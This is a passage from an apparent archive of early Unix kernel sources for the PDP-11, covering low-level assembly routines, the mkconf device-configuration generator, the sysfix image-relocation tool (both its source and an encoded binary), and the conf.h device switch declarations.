	mov	(r0)+,-(sp)
	mtpi	(r1)+
	sob	r2,1b
	br	2f

_copyout:
	jsr	pc,copsu
1:
	mov	(r0)+,-(sp)
	mtpd	(r1)+
	sob	r2,1b
2:
	mov	(sp)+,nofault
	mov	(sp)+,r2
	clr	r0
	rts	pc

copsu:
	mov	(sp)+,r0
	mov	r2,-(sp)
	mov	nofault,-(sp)
	mov	r0,-(sp)
	mov	10(sp),r0
	mov	12(sp),r1
	mov	14(sp),r2
	asr	r2
	mov	$1f,nofault
	rts	pc

1:
	mov	(sp)+,nofault
	mov	(sp)+,r2
	mov	$-1,r0
	rts	pc

.globl	_idle
_idle:
	mov	PS,-(sp)
	spl	0
	wait
	mov	(sp)+,PS
	rts	pc

.globl	_savu, _retu, _aretu
_savu:
	spl	HIGH
	mov	(sp)+,r1
	mov	(sp),r0
	mov	sp,(r0)+
	mov	r5,(r0)+
	spl	0
	jmp	(r1)

_aretu:
	spl	7
	mov	(sp)+,r1
	mov	(sp),r0
	br	1f

_retu:
	spl	7
	mov	(sp)+,r1
	mov	(sp),KDSA6
	mov	$_u,r0
1:
	mov	(r0)+,sp
	mov	(r0)+,r5
	spl	0
	jmp	(r1)

.globl	_spl0, _spl1, _spl4, _spl5, _spl6, _spl7
_spl0:
	spl	0
	rts	pc

_spl1:
	spl	1
	rts	pc

_spl4:
	spl	4
	rts	pc

_spl5:
	spl	5
	rts	pc

_spl6:
	spl	6
	rts	pc

_spl7:
	spl	HIGH
	rts	pc

.globl	_copyseg
_copyseg:
	mov	PS,-(sp)
	mov	4(sp),SISA0
	mov	6(sp),SISA1
	mov	$10000+HIPRI,PS
	mov	r2,-(sp)
	clr	r0
	mov	$8192.,r1
	mov	$32.,r2
1:
	mfpd	(r0)+
	mtpd	(r1)+
	sob	r2,1b
	mov	(sp)+,r2
	mov	(sp)+,PS
	rts	pc

.globl	_clearseg
_clearseg:
	mov	PS,-(sp)
	mov	4(sp),SISA0
	mov	$10000+HIPRI,PS
	clr	r0
	mov	$32.,r1
1:
	clr	-(sp)
	mtpd	(r0)+
	sob	r1,1b
	mov	(sp)+,PS
	rts	pc

.globl	_dpadd
_dpadd:
	mov	2(sp),r0
	add	4(sp),2(r0)
	adc	(r0)
	rts	pc

.globl	_dpcmp
_dpcmp:
	mov	2(sp),r0
	mov	4(sp),r1
	sub	6(sp),r0
	sub	8(sp),r1
	sbc	r0
	bge	1f
	cmp	r0,$-1
	bne	2f
	cmp	r1,$-512.
	bhi	3f
2:
	mov	$-512.,r0
	rts	pc
1:
	bne	2f
	cmp	r1,$512.
	blo	3f
2:
	mov	$512.,r1
3:
	mov	r1,r0
	rts	pc

.globl	_ldiv
_ldiv:
	clr	r0
	mov	2(sp),r1
	div	4(sp),r0
	rts	pc

.globl	_lrem
_lrem:
	clr	r0
	mov	2(sp),r1
	div	4(sp),r0
	mov	r1,r0
	rts	pc

.globl	_lshift
_lshift:
	mov	2(sp),r1
	mov	(r1)+,r0
	mov	(r1),r1
	ashc	4(sp),r0
	mov	r1,r0
	rts	pc

.globl	csv
csv:
	mov	r5,r0
	mov	sp,r5
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	jsr	pc,(r0)

.globl cret
cret:
	mov	r5,r1
	mov	-(r1),r4
	mov	-(r1),r3
	mov	-(r1),r2
	mov	r5,sp
	mov	(sp)+,r5
	rts	pc

.globl	_u
_u	= 140000
usize	= 16.

CSW	= 177570
PS	= 177776
SSR0	= 177572
SSR1	= 177574
SSR2	= 177576
SSR3	= 172516
KISA0	= 172340
KISA1	= 172342
KISA7	= 172356
KISD0	= 172300
KDSA0	= 172360
KDSA6	= 172374
KDSA7	= 172376
KDSD0	= 172320
MTC	= 172522
SISA0	= 172240
SISA1	= 172242
SISD0	= 172200
SISD1	= 172202
IO	= 177600

.data
.globl	_ka6
.globl	_cputype

_ka6:	KDSA6
_cputype:45.
stk:	0

.bss
.globl	nofault, ssr
nofault:.=.+2
ssr:	.=.+6
dispdly:.=.+2
saveps:	.=.+2

.text
/ system profiler
/
/rtt	= 6
/CCSB	= 172542
/CCSR	= 172540
/PS	= 177776
/
/.globl	_sprof, _xprobuf, _probuf, _probsiz, _mode
/_probsiz = 7500.+2048.
/
/_isprof:
/	mov	$_sprof,104	/ interrupt
/	mov	$340,106	/ pri
/	mov	$100.,CCSB	/ count set = 100
/	mov	$113,CCSR	/ count down, 10kHz, repeat
/	rts	pc
/
/_sprof:
/	mov	r0,-(sp)
/	mov	PS,r0
/	ash	$-11.,r0
/	bic	$!14,r0
/	add	$1,_mode+2(r0)
/	adc	_mode(r0)
/	cmp	r0,$14		/ user
/	beq	done
/	mov	2(sp),r0	/ pc
/	asr	r0
/	asr	r0
/	bic	$140001,r0
/	cmp	r0,$_probsiz
/	blo	1f
/	inc	_outside
/	br	done
/1:
/	inc	_probuf(r0)
/	bne	done
/	mov	r1,-(sp)
/	mov	$_xprobuf,r1
/2:
/	cmp	(r1)+,r0
/	bne	3f
/	inc	(r1)
/	br	4f
/3:
/	tst	(r1)+
/	bne	2b
/	sub	$4,r1
/	mov	r0,(r1)+
/	mov	$1,(r1)+
/4:
/	mov	(sp)+,r1
/done:
/	mov	(sp)+,r0
/	mov	$113,CCSR
/	rtt
/
/.bss
/_xprobuf:	.=.+512.
/_probuf:.=.+_probsiz
/_mode:	.=.+16.
/_outside: .=.+2
-- /usr/sys/conf/mkconf.c mode=0110664 uid=3 gid=3 atime=174927948 mtime=174889673 --
#define CHAR	01
#define BLOCK	02
#define INTR	04
#define EVEN	010
#define KL	020
#define ROOT	040
char	*btab[]
{
	"rk",
	"rp",
	"rf",
	"tm",
	"tc",
	"hs",
	"hp",
	"ht",
	0
};
char	*ctab[]
{
	"console",
	"pc",
	"lp",
	"dc",
	"dh",
	"dp",
	"dj",
	"dn",
	"mem",
	"rk",
	"rf",
	"rp",
	"tm",
	"hs",
	"hp",
	"ht",
	0
};
struct tab
{
	char	*name;
	int	count;
	int	address;
	int	key;
	char	*codea;
	char	*codeb;
	char	*codec;
	char	*coded;
	char	*codee;
} table[]
{
	"console",
	-1,	60,	CHAR+INTR+KL,
	"\tklin; br4\n\tklou; br4\n",
	".globl\t_klrint\nklin:\tjsr\tr0,call; _klrint\n",
	".globl\t_klxint\nklou:\tjsr\tr0,call; _klxint\n",
	"",
	"\t&klopen,   &klclose,  &klread,   &klwrite,  &klsgtty,",

	"mem",
	-1,	300,	CHAR,
	"",
	"",
	"",
	"",
	"\t&nulldev,  &nulldev,  &mmread,   &mmwrite,  &nodev,",

	"pc",
	0,	70,	CHAR+INTR,
	"\tpcin; br4\n\tpcou; br4\n",
	".globl\t_pcrint\npcin:\tjsr\tr0,call; _pcrint\n",
	".globl\t_pcpint\npcou:\tjsr\tr0,call; _pcpint\n",
	"",
	"\t&pcopen,   &pcclose,  &pcread,   &pcwrite,  &nodev,",

	"clock",
	-2,	100,	INTR,
	"\tkwlp; br6\n",
	".globl\t_clock\n",
	"kwlp:\tjsr\tr0,call; _clock\n",
	"",
	"",

	"parity",
	-1,	114,	INTR,
	"\ttrap; br7+7.\t\t/ 11/70 parity\n",
	"",
	"",
	"",
	"",

/*
 * 110 unused
 * 114 memory parity
 * 120 XY plotter
 * 124 DR11-B
 * 130 AD01
 * 134 AFC11
 * 140 AA11
 * 144 AA11
 * 150-174 unused
 */

	"lp",
	0,	200,	CHAR+INTR,
	"\tlpou; br4\n",
	"",
	".globl\t_lpint\nlpou:\tjsr\tr0,call; _lpint\n",
	"",
	"\t&lpopen,   &lpclose,  &nodev,    &lpwrite,  &nodev,",

	"rf",
	0,	204,	BLOCK+CHAR+INTR,
	"\trfio; br5\n",
	".globl\t_rfintr\n",
	"rfio:\tjsr\tr0,call; _rfintr\n",
	"\t&nulldev,\t&nulldev,\t&rfstrategy, \t&rftab,",
	"\t&nulldev,  &nulldev,  &rfread,   &rfwrite,  &nodev,",

	"hs",
	0,	204,	BLOCK+CHAR+INTR,
	"\thsio; br5\n",
	".globl\t_hsintr\n",
	"hsio:\tjsr\tr0,call; _hsintr\n",
	"\t&nulldev,\t&nulldev,\t&hsstrategy, \t&hstab,",
	"\t&nulldev,  &nulldev,  &hsread,   &hswrite,  &nodev,",

/*
 * 210 RC
 */

	"tc",
	0,	214,	BLOCK+INTR,
	"\ttcio; br6\n",
	".globl\t_tcintr\n",
	"tcio:\tjsr\tr0,call; _tcintr\n",
	"\t&nulldev,\t&tcclose,\t&tcstrategy, \t&tctab,",
	"",

	"rk",
	0,	220,	BLOCK+CHAR+INTR,
	"\trkio; br5\n",
	".globl\t_rkintr\n",
	"rkio:\tjsr\tr0,call; _rkintr\n",
	"\t&nulldev,\t&nulldev,\t&rkstrategy, \t&rktab,",
	"\t&nulldev,  &nulldev,  &rkread,   &rkwrite,  &nodev,",

	"tm",
	0,	224,	BLOCK+CHAR+INTR,
	"\ttmio; br5\n",
	".globl\t_tmintr\n",
	"tmio:\tjsr\tr0,call; _tmintr\n",
	"\t&tmopen,\t&tmclose,\t&tmstrategy, \t&tmtab,",
	"\t&tmopen,   &tmclose,  &tmread,   &tmwrite,  &nodev,",

	"ht",
	0,	224,	BLOCK+CHAR+INTR,
	"\thtio; br5\n",
	".globl\t_htintr\n",
	"htio:\tjsr\tr0,call; _htintr\n",
	"\t&htopen,\t&htclose,\t&htstrategy, \t&httab,",
	"\t&htopen,   &htclose,  &htread,   &htwrite,  &nodev,",

	"cr",
	0,	230,	CHAR+INTR,
	"\tcrin; br6\n",
	"",
	".globl\t_crint\ncrin:\tjsr\tr0,call; _crint\n",
	"",
	"\t&cropen,   &crclose,  &crread,   &nodev,    &nodev,",

/*
 * 234 UDC11
 */

	"rp",
	0,	254,	BLOCK+CHAR+INTR,
	"\trpio; br5\n",
	".globl\t_rpintr\n",
	"rpio:\tjsr\tr0,call; _rpintr\n",
	"\t&nulldev,\t&nulldev,\t&rpstrategy, \t&rptab,",
	"\t&nulldev,  &nulldev,  &rpread,   &rpwrite,  &nodev,",

	"hp",
	0,	254,	BLOCK+CHAR+INTR,
	"\thpio; br5\n",
	".globl\t_hpintr\n",
	"hpio:\tjsr\tr0,call; _hpintr\n",
	"\t&hpopen,\t&nulldev,\t&hpstrategy, \t&hptab,",
	"\t&hpopen,   &nulldev,  &hpread,   &hpwrite,  &nodev,",

/*
 * 260 TA11
 * 264-274 unused
 */

	"dc",
	0,	308,	CHAR+INTR,
	"\tdcin; br5+%d.\n\tdcou; br5+%d.\n",
	".globl\t_dcrint\ndcin:\tjsr\tr0,call; _dcrint\n",
	".globl\t_dcxint\ndcou:\tjsr\tr0,call; _dcxint\n",
	"",
	"\t&dcopen,   &dcclose,  &dcread,   &dcwrite,  &dcsgtty,",

	"kl",
	0,	308,	INTR+KL,
	"\tklin; br4+%d.\n\tklou; br4+%d.\n",
	"",
	"",
	"",
	"",

	"dp",
	0,	308,	CHAR+INTR,
	"\tdpin; br6+%d.\n\tdpou; br6+%d.\n",
	".globl\t_dprint\ndpin:\tjsr\tr0,call; _dprint\n",
	".globl\t_dpxint\ndpou:\tjsr\tr0,call; _dpxint\n",
	"",
	"\t&dpopen,   &dpclose,  &dpread,   &dpwrite,  &nodev,",

/*
 * DM11-A
 */

	"dn",
	0,	304,	CHAR+INTR,
	"\tdnou; br5+%d.\n",
	"",
	".globl\t_dnint\ndnou:\tjsr\tr0,call; _dnint\n",
	"",
	"\t&dnopen,   &dnclose,  &nodev,    &dnwrite,  &nodev,",

	"dhdm",
	0,	304,	INTR,
	"\tdmin; br4+%d.\n",
	"",
	".globl\t_dmint\ndmin:\tjsr\tr0,call; _dmint\n",
	"",
	"",

/*
 * DR11-A+
 * DR11-C+
 * PA611+
 * PA611+
 * DT11+
 * DX11+
 */

	"dl",
	0,	308,	INTR+KL,
	"\tklin; br4+%d.\n\tklou; br4+%d.\n",
	"",
	"",
	"",
	"",

/*
 * DJ11
 */

	"dh",
	0,	308,	CHAR+INTR+EVEN,
	"\tdhin; br5+%d.\n\tdhou; br5+%d.\n",
	".globl\t_dhrint\ndhin:\tjsr\tr0,call; _dhrint\n",
	".globl\t_dhxint\ndhou:\tjsr\tr0,call; _dhxint\n",
	"",
	"\t&dhopen,   &dhclose,  &dhread,   &dhwrite,  &dhsgtty,",

/*
 * GT40
 * LPS+
 * VT20
 */

	0
};

char	*stra[]
{
	"/ low core",
	"",
	"br4 = 200",
	"br5 = 240",
	"br6 = 300",
	"br7 = 340",
	"",
	". = 0^.",
	"\tbr\t1f",
	"\t4",
	"",
	"/ trap vectors",
	"\ttrap; br7+0.\t\t/ bus error",
	"\ttrap; br7+1.\t\t/ illegal instruction",
	"\ttrap; br7+2.\t\t/ bpt-trace trap",
	"\ttrap; br7+3.\t\t/ iot trap",
	"\ttrap; br7+4.\t\t/ power fail",
	"\ttrap; br7+5.\t\t/ emulator trap",
	"\ttrap; br7+6.\t\t/ system entry",
	"",
	". = 40^.",
	".globl\tstart, dump",
	"1:\tjmp\tstart",
	"\tjmp\tdump",
	"",
	0,
};

char	*strb[]
{
	"",
	". = 240^.",
	"\ttrap; br7+7.\t\t/ programmed interrupt",
	"\ttrap; br7+8.\t\t/ floating point",
	"\ttrap; br7+9.\t\t/ segmentation violation",
	0
};

char	*strc[]
{
	"",
	"/ floating vectors",
	". = 300^.",
	0,
};

char	*strd[]
{
	"",
	"//////////////////////////////////////////////////////",
	"/\t\tinterface code to C",
	"//////////////////////////////////////////////////////",
	"",
	".globl\tcall, trap",
	0
};

char	*stre[]
{
	"/*",
	" */",
	"",
	"int\t(*bdevsw[])()",
	"{",
	0,
};

char	*strf[]
{
	"\t0",
	"};",
	"",
	"int\t(*cdevsw[])()",
	"{",
	0,
};

char	*strg[]
{
	"\t0",
	"};",
	"",
	"int\trootdev\t{(%d<<8)|0};",
	"int\tswapdev\t{(%d<<8)|0};",
	"int\tswplo\t4000;\t/* cannot be zero */",
	"int\tnswap\t872;",
	0,
};

int	fout;
int	root	-1;

main()
{
	register struct tab *p;
	register *q;
	int i, n, ev, nkl;
	int flagf, flagb;

	while(input());

/*
 * pass1 -- create interrupt vectors
 */
	nkl = 0;
	flagf = flagb = 1;
	fout = creat("l.s", 0666);
	puke(stra);
	for(p=table; p->name; p++)
	if(p->count != 0 && p->key & INTR) {
		if(p->address>240 && flagb) {
			flagb = 0;
			puke(strb);
		}
		if(p->address >= 300) {
			if(flagf) {
				ev = 0;
				flagf = 0;
				puke(strc);
			}
			if(p->key & EVEN && ev & 07) {
				printf("\t.=.+4\n");
				ev =+ 4;
			}
			ev =+ p->address - 300;
		} else
			printf("\n. = %d^.\n", p->address);
		n = p->count;
		if(n < 0)
			n = -n;
		for(i=0; i<n; i++)
			if(p->key & KL) {
				printf(p->codea, nkl, nkl);
				nkl++;
			} else
			printf(p->codea, i, i);
	}
	if(flagb)
		puke(strb);
	puke(strd);
	for(p=table; p->name; p++)
	if(p->count != 0 && p->key & INTR)
		printf("\n%s%s", p->codeb, p->codec);
	flush();
	close(fout);

/*
 * pass 2 -- create configuration table
 */

	fout = creat("c.c", 0666);
	puke(stre);
	for(i=0; q=btab[i]; i++) {
		for(p=table; p->name; p++)
		if(equal(q, p->name) &&
		   (p->key&BLOCK) && p->count) {
			printf("%s\t/* %s */\n", p->coded, q);
			if(p->key & ROOT)
				root = i;
			goto newb;
		}
		printf("\t&nodev,\t\t&nodev,\t\t&nodev,\t\t0,\t/* %s */\n", q);
	newb:;
	}
	puke(strf);
	for(i=0; q=ctab[i]; i++) {
		for(p=table; p->name; p++)
		if(equal(q, p->name) &&
		   (p->key&CHAR) && p->count) {
			printf("%s\t/* %s */\n", p->codee, q);
			goto newc;
		}
		printf("\t&nodev,    &nodev,    &nodev,    &nodev,    &nodev,\t/* %s */\n", q);
	newc:;
	}
	puke(strg, root);
	flush();
	close(fout);
	if(root < 0)
		write(2, "no block device given\n", 22);
}

puke(s, a)
char **s;
{
	char *c;

	while(c = *s++) {
		printf(c, a);
		printf("\n");
	}
}

input()
{
	char line[100];
	register char *p;
	register struct tab *q;
	register n;

	p = line;
	while((n=getchar()) != '\n') {
		if(n == 0)
			return(0);
		if(n == ' ' || n == '\t')
			continue;
		*p++ = n;
	}
	*p++ = 0;
	n = 0;
	p = line;
	while(*p>='0' && *p<='9') {
		n =* 10;
		n =+ *p++ - '0';
	}
	if(n == 0)
		n = 1;
	if(*p == 0)
		return(1);
	for(q=table; q->name; q++)
	if(equal(q->name, p)) {
		if(root < 0 && (q->key&BLOCK)) {
			root = 0;
			q->key =| ROOT;
		}
		if(q->count < 0) {
			printf("%s: no more, no less\n", p);
			return(1);
		}
		q->count =+ n;
		if(q->address < 300 && q->count > 1) {
			q->count = 1;
			printf("%s: only one\n", p);
		}
		return(1);
	}
	if(equal(p, "done"))
		return(0);
	printf("%s: cannot find\n", p);
	return(1);
}

equal(a, b)
char *a, *b;
{

	while(*a++ == *b)
		if(*b++ == 0)
			return(1);
	return(0);
}

getchar()
{
	int c;

	c = 0;
	read(0, &c, 1);
	return(c);
}
-- /usr/sys/conf/sysfix mode=0100777 uid=0 gid=3 atime=174910967 mtime=174890122 base64=1 --
BwEQCM4AMAjMAwAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8J3AcBiXcJygf1JQMABAAIB8
4VJgjfCfYDzhUBAN8J3AcOCkAdBgAmHAIA3wnWBtYLNxCWCAgEzhUxCN8J9gPOFQEA3wnc
Bw4KQB0GACYcAgDfCdYG1gs3EHYKzhXqDEAdBgAmHAQA3wn0BtYLwAsIBM4VPQjfCfYDzh
UBAN8J3AfOFd4I3wlMBsAlBwEIA84VSgjfCfYDzhUBAN8J3AfOFeoM5hUHAd8JEgfWC84V
3gjfCUwGNxAkDs4V3gjfCUwGNxAaDs4V3gjfCUwGNxAQDs4V3gjfCUwGNxAGDs4V3gjfCU
wGzhXeCN8JTAbOFd4I3wlMBsALCAPOFVwI3wn2A84VAQDfCdwHzhXqDOYdzA3fCRIH1gvO
FeoM5h3ADd8JEgfWC84V6gzmHbQN3wkSB9YLzhXqDOYdqA3fCRIH1gvOFeoMJgrfCRIH1g
vOFeoMJgrfCRIH1gvOFeoM5hUBAN8JEgfWC8Adcg0ACzcQdA03ClgHDgrmHWINzmUQAOYd
SAffCbgHliUOCuYdTg3OZRAA5h06Cd8JuAeWJc4VAQDmHTgN5h0oCd8JuAeWJc4VAQDmHS
gN5h0WCd8JuAeWJcIdGg2CDIAQwgrACxoDzhXeCN8JTAYEEM4V5ArfCUwGAxDDNQEAAgPE
7fgMzhDfCbQDBGDOFeoMJhHfCRIH1gviATcKzAg3CsIGDgrmHcwMzmUQAOYduAjfCbgHli
XOFQEA5h24DOYdpgjfCbgHliUOCuYVEADmHZAG3wm4B5Ylwh2YDIIMgBDCCsALGgPOFeQK
3wlMBgMQzhXeCN8JTAYEEMM1AQACA8TtkAXOEN8JtAMEYM4V6gwmEd8JEgfWC+IBNwpGBg
4K5h1QDM5lEADmHTYG3wm4B5YlzhUBAOYdOgzmHSQG3wm4B5YlzhUBAOYdKgzmHRIG3wm4
B5YlzhUBAOYdGAzmHQAG3wm4B5Ylwh0ODMLlDADCC1UFzhXqDOYV3gj3CVAD1gsmEN8JEg
fWC84V6gzmFd4I9wk6A9YLJhDfCRIH1gvOFeoM5hXeCPcJJAPWCyYQ3wkSB9YLzhXqDOYV
3gj3CQ4D1gsmEN8JEgfWC84V3gjfCUwGAxDOFeoM5hDfCRIH1gvOFd4I3wlMBgQQwBDARf
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
AFAH
-- /usr/sys/conf/sysfix.c mode=0100664 uid=3 gid=3 atime=174910969 mtime=174887950 --
/*
 * fix system image for I/D space
 *  Move data down to 0; move text to 4K.
 *  Also put the data at the start of the
 *  file and the text after it.
 */

int	tbuf[259];
int	rbuf[259];
int	obuf[259];
int	txtsiz;
int	datsiz;
int	bsssiz;
int	symsiz;

int	txtrel	8192;
int	datrel;


main(argc, argv)
char **argv;
{
	register word, rel, s;

	if (argc<3) {
		printf("Arg count\n");
		exit(1);
	}
	if ((tbuf[0] = open(argv[1], 0)) < 0) {
		printf("Input file\n");
		exit(1);
	}
	rbuf[0] = open(argv[1], 0);
	if ((fcreat(argv[2], obuf)) < 0) {
		printf("Output file\n");
		exit(1);
	}
	if (getw(tbuf) != 0407) {
		printf("Bad input format\n");
		exit(1);
	}
	putw(0407, obuf);
	txtsiz = getw(tbuf);
	datsiz = getw(tbuf);
	bsssiz = getw(tbuf);
	symsiz = getw(tbuf);
	getw(tbuf);
	getw(tbuf);
	if (getw(tbuf) != 0) {
		printf("No relocation bits\n");
		exit(1);
	}
	putw(txtsiz, obuf);
	putw(datsiz, obuf);
	putw(bsssiz, obuf);
	putw(symsiz, obuf);
	putw(0, obuf);
	putw(0, obuf);
	putw(1, obuf);
	datrel = -txtsiz;
/*
 *  Copy out data first
 */
	tbuf[1] = 0;
	seek(tbuf[0], 020+txtsiz, 0);
	seek(rbuf[0], 020+txtsiz, 0);
	seek(rbuf[0], txtsiz, 1);
	seek(rbuf[0], datsiz, 1);
	s = datsiz >> 1;
	while (s--) {
		word = getw(tbuf);
		rel = getw(rbuf);
		if (rel&01)
			word =- datrel;
		word =+ getrel(rel);
		putw(word, obuf);
	}
/*
 * Now to the text.
 */
	rbuf[1] = 0;
	tbuf[1] = 0;
	seek(rbuf[0], 020+txtsiz, 0);
	seek(rbuf[0], datsiz, 1);
	seek(tbuf[0], 020, 0);
	s = txtsiz >> 1;
	while(s--) {
		rel = getw(rbuf);
		word = getw(tbuf);
		if (rel&01)
			word =- txtrel;
		word =+ getrel(rel);
		putw(word, obuf);
	}
/*
 * The symbol table.
 */
	tbuf[1] = 0;
	seek(tbuf[0], 020+txtsiz, 0);
	seek(tbuf[0], txtsiz, 1);
	seek(tbuf[0], datsiz, 1);
	seek(tbuf[0], datsiz, 1);
	s = symsiz;
	while ((s =- 12) >= 0) {
		putw(getw(tbuf), obuf);
		putw(getw(tbuf), obuf);
		putw(getw(tbuf), obuf);
		putw(getw(tbuf), obuf);
		rel = getw(tbuf);
		putw(rel, obuf);
		word = getw(tbuf);
		switch(rel&07) {
			case 2:
				word =+ txtrel;
				break;

			case 3:
			case 4:
				word =+ datrel;
		}
		putw(word, obuf);
	}
	fflush(obuf);
	close(obuf[0]);
	exit(0);
}

getrel(r)
{
	switch (r&016) {

	case 02:	/* ref to text */
		return(txtrel);

	case 04:		/* ref to data */
	case 06:		/* ref to bss */
		return(datrel);

	case 0:
		return(0);

	default:
		printf("Bad relocation %o\n", r);
		return(0);
	}
}
-- /usr/sys/conf.h mode=0100664 uid=3 gid=3 atime=174921998 mtime=169261008 --
/*
 * Used to dissect integer device code
 * into major (driver designation) and
 * minor (driver parameter) parts.
 */
struct
{
	char	d_minor;
	char	d_major;
};

/*
 * Declaration of block device
 * switch. Each entry (row) is
 * the only link between the
 * main unix code and the driver.
 * The initialization of the
 * device switches is in the
 * file conf.c.
 */
struct	bdevsw
{
	int	(*d_open)();
	int	(*d_close)();
	int	(*d_strategy)();
	int	*d_tab;
} bdevsw[];

/*
 * Nblkdev is the number of entries
 * (rows) in the block switch. It is
 * set in binit/bio.c by making
 * a pass over the switch.
 * Used in bounds checking on major
 * device numbers.
 */
int	nblkdev;

/*
 * Character device switch.
 */
struct	cdevsw
{
	int	(*d_open)();
	int	(*d_close)();
	int	(*d_read)();
	int	(*d_write)();
	int	(*d_sgtty)();
} cdevsw[];

/*
 * Number of character switch entries.
 * Set by cinit/tty.c
 */
int	nchrdev;
-- /usr/sys/dmr mode=0140775 uid=3 gid=3 atime=174929542 mtime=174922028 --
-- /usr/sys/dmr/bio.c mode=0110664 uid=3 gid=3 atime=174921820 mtime=174905832 --
#
/*
 */

